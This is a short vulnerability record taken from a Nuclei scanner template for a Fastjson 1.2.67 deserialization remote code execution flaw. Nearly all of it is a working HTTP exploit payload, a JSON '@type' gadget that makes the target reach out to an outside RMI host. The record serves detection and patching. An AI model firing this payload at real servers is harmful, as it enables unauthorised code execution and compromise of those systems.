# Vulnerability: Fastjson 1.2.67 - Remote Code Execution
**Classification:** CWE-77,CWE-502
**Source:** Nuclei Template (`fastjson-1-2-67-rce.yaml`)

## Description
Fastjson 1.2.67 is susceptible to a remote code execution vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
   "@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",
   "properties":{
      "@type":"java.util.Properties",
      "UserTransaction":"rmi://{{interactsh-url}}/Exploit"
   }
}
```

